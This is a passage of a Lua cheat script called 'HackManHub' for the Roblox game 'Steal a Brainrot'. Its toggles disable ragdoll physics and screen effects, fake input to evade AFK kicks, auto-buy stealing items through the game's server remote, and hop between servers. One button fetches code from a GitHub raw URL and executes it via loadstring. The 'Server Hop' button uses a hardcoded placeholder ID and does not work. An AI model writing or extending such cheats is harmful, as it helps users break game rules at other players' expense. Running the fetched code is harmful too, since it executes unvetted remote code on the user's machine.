                        if not CanCollide then
                            RootPart.CanCollide = true
                        end
                    end)

                    local RagdollClient = WaitForChild(Character, "RagdollClient")
                    RagdollClient.Enabled = false

                    OnPropertyChange(RagdollClient, "Enabled", function(Enabled)
                        if Enabled then
                            RagdollClient.Enabled = false
                        end
                    end)

                    local Humanoid = WaitForChild(Character, "Humanoid")

                    Humanoid.StateChanged:Connect(function(_, State)
                        if table.find(Config.BlacklistedHumanoidStates, State) then
                            Humanoid:ChangeState(Enum.HumanoidStateType.Running)
                        end
                    end)

                    for _, Child in ipairs(Character:GetChildren()) do
                        if not Child:IsA("MeshPart") and Child ~= RootPart then
                            continue
                        end

                        Child.Anchored = false

                        OnPropertyChange(Child, "Anchored", function(Anchored)
                            if Anchored then
                                Child.Anchored = false
                            end
                        end)

                        ForEachChild(Child, "Attachment", function(Attachment)
                            Attachment:Destroy()
                        end)
                    end
                end

                local Character = GetCharacter()

                if Character then
                    HookCharacter(Character)
                end

                GetSelf().CharacterAdded:Connect(function(Character)
                    HookCharacter(Character)
                end)
            end)
            Fluent:Notify({
                Title = "HackManHub",
                Content = "Anti Ragdoll is now enabled.",
                Duration = 5
            })
        else
            running = false
            Fluent:Notify({
                Title = "HackManHub",
                Content = "Anti Ragdoll is now disabled.",
                Duration = 5
            })
        end
    end
})

local Toggle = Tabs.Player:AddToggle("MyToggle", {
    Title = "Disable All Screen Effects",
    Description = "Disable All Screen Effects Like Bee Launcher and Blur",
    Default = false,
    Callback = function(state)
        local Config = {
            BlacklistedObjects = {
                "BeeBlur",
                "ColorCorrection",
                "DiscoEffect",
                "Blur",
            },
        }

        local function Notify(title, text)
            Fluent:Notify({
                Title = title,
                Content = text,
                Duration = 5
            })
        end

        local function ForEachChild(parent, name, callback)
            for _, child in ipairs(parent:GetDescendants()) do
                if child.Name == name then
                    callback(child)
                end
            end
        end

        if state then
            task.spawn(function()
                for _, BlacklistedObject in ipairs(Config.BlacklistedObjects) do
                    ForEachChild(game.Lighting, BlacklistedObject, function(Object)
                        Notify("Blacklisted Lighting Effects", "Deleted " .. BlacklistedObject)
                        Object:Destroy()
                    end)
                end
            end)
            Fluent:Notify({
                Title = "HackManHub",
                Content = "Disable All Screen Effects is now enabled.",
                Duration = 5
            })
        else
            Fluent:Notify({
                Title = "HackManHub",
                Content = "Disable All Screen Effects is now disabled.",
                Duration = 5
            })
        end
    end
})


local Toggle = Tabs.Player:AddToggle("MyToggle", {
    Title = "Disable All Animations",
    Description = "Disable All Animations Like Boogie Bomb",
    Default = false,
    Callback = function(state)
        task.spawn(function()
            local Config = {
                BlacklistedAnimations = {
                    "rbxassetid://109061983885712", -- Boogie Bomb
                },
            }

            local function Notify(title, text)
                Fluent:Notify({
                    Title = title,
                    Content = text,
                    Duration = 5
                })
            end

            local function WaitForChild(parent, childName)
                return parent:WaitForChild(childName)
            end

            local function GetSelf()
                return game:GetService("Players").LocalPlayer
            end

            local function GetHumanoid()
                local char = GetSelf().Character
                if char then
                    return char:FindFirstChildOfClass("Humanoid")
                end
            end

            local function HookHumanoid(Humanoid)
                Humanoid.AnimationPlayed:Connect(function(Animation)
                    local Id = Animation.Animation.AnimationId
                    if table.find(Config.BlacklistedAnimations, Id) then
                        Notify("Blacklisted Animations", "Stopped " .. Id)
                        Animation:Stop()
                    end
                end)
            end

            if state then
                local Humanoid = GetHumanoid()
                if Humanoid then
                    HookHumanoid(Humanoid)
                end

                GetSelf().CharacterAdded:Connect(function(Character)
                    local Humanoid = WaitForChild(Character, "Humanoid")
                    HookHumanoid(Humanoid)
                end)

                Fluent:Notify({
                    Title = "HackManHub",
                    Content = "Disable All Animations is now enabled.",
                    Duration = 5
                })
            else
                Fluent:Notify({
                    Title = "HackManHub",
                    Content = "Disable All Animations is now disabled.",
                    Duration = 5
                })
            end
        end)
    end
})

local Toggle = Tabs.Player:AddToggle("MyToggle", {
    Title = "🐝Anti Bee Launcher",
    Description = "Anti Bee Launcher Disables Bee Launcher",
    Default = false,
    Callback = function(state)
        task.spawn(function()
            local function ForEachChild(parent, className, callback)
                for _, descendant in ipairs(parent:GetDescendants()) do
                    if descendant:IsA(className) then
                        callback(descendant)
                    end
                end
            end

            local function Notify(title, text)
                Fluent:Notify({
                    Title = title,
                    Content = text,
                    Duration = 5
                })
            end

            local function GetSelf()
                return game:GetService("Players").LocalPlayer
            end

            local function GetCharacter()
                return GetSelf().Character
            end

            local function WaitForChild(parent, childName)
                return parent:WaitForChild(childName)
            end

            local function FindChild(parent, childName)
                local current = parent
                for part in childName:gmatch("[^/]+") do
                    if current then
                        current = current:FindFirstChild(part)
                    else
                        return nil
                    end
                end
                return current
            end

            local function HookHead(Head)
                ForEachChild(Head, "ParticleEmitter", function(ParticleEmitter)
                    Notify("Anti Bee Launcher", "Deleted ParticleEmitter")
                    ParticleEmitter:Destroy()
                end)
            end

            if state then
                local Head = FindChild(GetCharacter(), "Head")
                if Head then
                    HookHead(Head)
                end

                GetSelf().CharacterAdded:Connect(function(Character)
                    local Head = WaitForChild(Character, "Head")
                    HookHead(Head)
                end)

                Fluent:Notify({
                    Title = "HackManHub",
                    Content = "Anti Bee Launcher is now enabled.",
                    Duration = 5
                })
            else
                Fluent:Notify({
                    Title = "HackManHub",
                    Content = "Anti Bee Launcher is now disabled.",
                    Duration = 5
                })
            end
        end)
    end
})


local Toggle = Tabs.Player:AddToggle("MyToggle", {
    Title = "Anti AFK",
    Description = "Anti AFK so you don't get kicked",
    Default = false,
    Callback = function(state)
        local Players = game:GetService("Players")
        local VirtualUser = game:GetService("VirtualUser")
        local LocalPlayer = Players.LocalPlayer

        if not _G.AfkConnection then _G.AfkConnection = nil end

        if state then
            _G.AfkConnection = LocalPlayer.Idled:Connect(function()
                VirtualUser:CaptureController()
                VirtualUser:ClickButton2(Vector2.new())
            end)
            Fluent:Notify({
                Title = "HackManHub",
                Content = "Anti AFK is now enabled.",
                Duration = 5
            })
        else
            if _G.AfkConnection then
                _G.AfkConnection:Disconnect()
                _G.AfkConnection = nil
            end
            Fluent:Notify({
                Title = "HackManHub",
                Content = "Anti AFK is now disabled.",
                Duration = 5
            })
        end
    end
})

local Toggle = Tabs.Buy:AddToggle("MyToggle", {
    Title = " Auto Buy Essentials",
    Description = "Auto Buy Essentials For Auto Stealing, Stealing Normally, Also for Speed boost",
    Default = false,
    Callback = function(state)
        local function Notify(Title, Text, Duration)
            local StarterGui = game:GetService("StarterGui")
            StarterGui:SetCore("SendNotification", {
                Title = Title or "Notification",
                Text = Text,
                Duration = Duration or 0,
            })
        end

        local function FindChild(Parent, Path)
            if type(Parent) ~= "table" and not Parent:IsA("Instance") then
                return
            end
            local Current = Parent
            for ChildName in string.gmatch(Path, "[^/]+") do
                if not Current then return end
                Current = Current:FindFirstChild(ChildName)
            end
            return Current
        end

        local function GetBackpack()
            return game.Players.LocalPlayer:FindFirstChild("Backpack")
        end

        local function EquipTool(Tool)
            if Tool and Tool:IsA("Tool") then
                local Humanoid = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
                if Humanoid then
                    Humanoid:EquipTool(Tool)
                end
            end
        end

        local function ActivateTool(Tool)
            if Tool and Tool:IsA("Tool") then
                Tool:Activate()
            end
        end

        local function MainScript()
            local Config = {
                Interval = 0.6,
                Items = {
                    "Invisibility Cloak",
                    "Medusa's Head",
                    "Quantum Cloner",
                    "Body Swap Potion",
                    "Web Slinger",
                    "Trap",
                },
                Equip = "Invisibility Cloak",
            }

            task.spawn(function()
                if not (Config.Equip and Config.Equip ~= "") then
                    return
                end

                local function GetTool()
                    return FindChild(GetBackpack(), Config.Equip)
                end

                local function EquipAndActivateTool()
                    local Tool = GetTool()

                    while not Tool and task.wait() do
                        Tool = GetTool()
                    end

                    EquipTool(Tool)
                    ActivateTool(Tool)
                    Notify("Shop", "Activated " .. Config.Equip)
                end

                EquipAndActivateTool()
                game.Players.LocalPlayer.CharacterAdded:Connect(EquipAndActivateTool)
            end)

            local ReplicatedStorage = game:GetService("ReplicatedStorage")
            local Net = ReplicatedStorage:WaitForChild("Packages"):WaitForChild("Net")
            local Buy = Net:WaitForChild("RF/CoinsShopService/RequestBuy")

            for _, Item in ipairs(Config.Items) do
                task.wait(Config.Interval)
                Buy:InvokeServer(Item)
                Notify("Shop", "Purchased " .. Item)
            end
        end

        if state then
            MainScript()
            print("on")
        else
            print("off")
        end
    end
})

local jobId = ""

local Input = Tabs.Server:AddInput("Input", {
    Title = "Enter Job ID",
    Default = "Enter Job ID",
    Placeholder = "e.g., 07431dbd-8ae7-417e-a242-e5a01a33c740",
    Numeric = false,
    Finished = false,
    Callback = function(Value)
        jobId = Value
    end
})

Tabs.Server:AddButton({
    Title = "Join Job ID",
    Callback = function()
        if jobId ~= "" then
            local placeId = game.PlaceId
            local currentJobId = game.JobId

            if jobId == currentJobId then
                Fluent:Notify({
                    Title = "[✅] Already in the Server",
                    Content = "You are already in the server with this Job ID.",
                    Duration = 5
                })
            else
                local success, errorMessage = pcall(function()
                    TeleportService:TeleportToPlaceInstance(placeId, jobId, Players.LocalPlayer)
                end)

                if not success then
                    Fluent:Notify({
                        Title = "[⚠️] Error",
                        Content = "Failed to teleport to the specified Job ID: " .. errorMessage,
                        Duration = 5
                    })
                else
                    Fluent:Notify({
                        Title = "[🚀] Teleporting",
                        Content = "Attempting to join Job ID: " .. jobId,
                        Duration = 5
                    })
                end
            end
        else
            Fluent:Notify({
                Title = "[⚠️] Error",
                Content = "Please enter a valid Job ID.",
                Duration = 5
            })
        end
    end
})

Tabs.Server:AddButton({
    Title = "Clear Job ID",
    Callback = function()
        jobId = ""
        Input:SetValue("")

        Fluent:Notify({
            Title = "[✔️] Cleared",
            Content = "Job ID has been cleared.",
            Duration = 5
        })
    end
})

Tabs.Server:AddButton({
    Title = "Auto Server Hopper V2",
    Description = "hops server fast",
    Callback = function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ndaju/dsfafa/refs/heads/main/serverhopper.txt"))()

    end
})

Tabs.Server:AddButton({
    Title = "Copy Job ID",
    Description = "Copies Your Server Job Id to Clipboard",
    Callback = function()
        local Players = game:GetService("Players")
        local LocalPlayer = Players.LocalPlayer

        local function copyToClipboard(text)
            if setclipboard then
                setclipboard(text)
            else
                warn("setclipboard is not available in this environment.")
            end
        end

        local jobId = game.JobId

        copyToClipboard(jobId)

        Fluent:Notify({
            Title = "[✔️] Success",
            Content = "Job ID copied to clipboard: " .. jobId,
            Duration = 5
        })
    end
})

local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local placeId = game.PlaceId
local currentJobId = game.JobId

local TeleportService = game:GetService("TeleportService")
local Players = game:GetService("Players")
local placeId = game.PlaceId
local currentJobId = game.JobId

Tabs.Server:AddButton({
    Title = "Server Hop",
    Description = "Teleports you to a different server in the same game",
    Callback = function()
        local success, errorMessage = pcall(function()
            local servers = {} 
            local newJobId = "new_job_id_example"  -- You would dynamically get this in your system

            if newJobId ~= currentJobId then
                TeleportService:TeleportToPlaceInstance(placeId, newJobId, Players.LocalPlayer)
                Fluent:Notify({
                    Title = "[🚀] Server Hopping",
                    Content = "Attempting to hop to a new server...",
                    Duration = 5
                })
            else
                Fluent:Notify({
                    Title = "[✅] Already in a Different Server",
                    Content = "You are already in a different server.",
                    Duration = 5
                })
            end
        end)

        if not success then
            if errorMessage:match("Error Code: 773") then
                Fluent:Notify({
                    Title = "[⚠️] Teleport Error",
                    Content = "The game instance cannot be joined (Error Code 773). Please try again later.",
                    Duration = 5
                })
            else
                Fluent:Notify({
                    Title = "[⚠️] Error",
                    Content = "An error occurred while attempting to hop to a new server: " .. errorMessage,
                    Duration = 5
                })
            end
        end
    end
})




-- Addons:
-- SaveManager (Allows you to have a configuration system)
-- InterfaceManager (Allows you to have a interface managment system)

-- Hand the library over to our managers
SaveManager:SetLibrary(Fluent)
InterfaceManager:SetLibrary(Fluent)

-- Ignore keys that are used by ThemeManager.
-- (we dont want configs to save themes, do we?)
SaveManager:IgnoreThemeSettings()

-- You can add indexes of elements the save manager should ignore
SaveManager:SetIgnoreIndexes({})

-- use case for doing it this way:
-- a script hub could have themes in a global folder
-- and game configs in a separate folder per game
InterfaceManager:SetFolder("HackManHub")
SaveManager:SetFolder("HackManHub/StealaBrainrotMain")

InterfaceManager:BuildInterfaceSection(Tabs.Settings)
SaveManager:BuildConfigSection(Tabs.Settings)


Window:SelectTab(2)

Fluent:Notify({
    Title = "HackManHub",
    Content = "The script is fully loaded",
    Duration = 10
})


--

local player = game.Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local decalId = "rbxassetid://135562230495518"

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "DraggableImageButtonGui"
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

local imageButton = Instance.new("ImageButton")
imageButton.Name = "DraggableButton"
imageButton.Image = decalId
imageButton.Size = UDim2.new(0, 65, 0, 65)
imageButton.AnchorPoint = Vector2.new(0.5, 0.5)
imageButton.Position = UDim2.new(0, 100, 1, -400)
imageButton.BackgroundTransparency = 0
imageButton.AutoButtonColor = false
imageButton.Parent = screenGui

local dragging, dragInput, mousePos, buttonPos = false

imageButton.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		dragging, mousePos, buttonPos = true, input.Position, imageButton.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then dragging = false end
		end)
	end
end)

imageButton.InputChanged:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
		dragInput = input
	end
end)

game:GetService("UserInputService").InputChanged:Connect(function(input)
	if input == dragInput and dragging then
		local delta = input.Position - mousePos
		imageButton.Position = UDim2.new(
			buttonPos.X.Scale, buttonPos.X.Offset + delta.X,
			buttonPos.Y.Scale, buttonPos.Y.Offset + delta.Y
		)
	end
end)

imageButton.MouseButton1Click:Connect(function()
	Window:Minimize()
end)

local gui = Fluent.GUI
local playerGui = player.PlayerGui

if _G.fluentLoopRunning then
    _G.fluentLoopRunning = _G.fluentLoopRunning + 1
else
    _G.fluentLoopRunning = 1
end
local runId = _G.fluentLoopRunning

task.spawn(function()
    while gui and gui:IsDescendantOf(game) do
        if _G.fluentLoopRunning ~= runId then break end
        task.wait(0.05)
    end
    if _G.fluentLoopRunning == runId then
        local drag = playerGui:FindFirstChild("DraggableImageButtonGui")
        if drag then drag.Enabled = true end
    end
end)

task.spawn(function()
    while true do
        if _G.fluentLoopRunning ~= runId then break end
        if not gui or not gui:IsDescendantOf(game) then
            local drag = playerGui:FindFirstChild("DraggableImageButtonGui")
            if drag then drag:Destroy() end
            break
        end
        local minimized = Fluent and Fluent.Window and Fluent.Window.Minimized
        local drag = playerGui:FindFirstChild("DraggableImageButtonGui")
        if drag then drag.Enabled = minimized end
        task.wait(0.025)
    end
    if _G.fluentLoopRunning == runId then
        local drag = playerGui:FindFirstChild("DraggableImageButtonGui")
        if drag then drag.Enabled = true end
    end
end)
-- You can use the SaveManager:LoadAutoloadConfig() to load a config
-- which has been marked to be one that auto loads!
SaveManager:LoadAutoloadConfig()



getgenv().executedfrommenu = false
